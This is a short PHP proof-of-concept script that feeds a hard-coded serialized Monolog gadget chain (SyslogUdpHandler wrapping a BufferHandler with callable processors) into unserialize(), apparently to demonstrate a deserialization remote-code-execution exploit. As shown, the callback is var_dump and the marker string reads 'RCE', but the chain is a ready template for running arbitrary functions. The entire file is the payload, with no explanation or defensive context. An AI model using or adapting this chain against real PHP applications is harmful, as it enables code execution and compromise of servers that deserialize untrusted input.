<?php
require_once(__DIR__ . '/../vendor/autoload.php');
$payload = 'O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:6:"socket";O:29:"Monolog\Handler\BufferHandler":7:{s:7:"handler";r:2;s:10:"bufferSize";i:-1;s:6:"buffer";a:1:{i:0;a:2:{i:0;s:3:"RCE";s:5:"level";N;}}s:5:"level";N;s:11:"initialized";b:1;s:11:"bufferLimit";i:-1;s:10:"processors";a:2:{i:0;s:7:"current";i:1;s:8:"var_dump";}}}';
unserialize($payload);
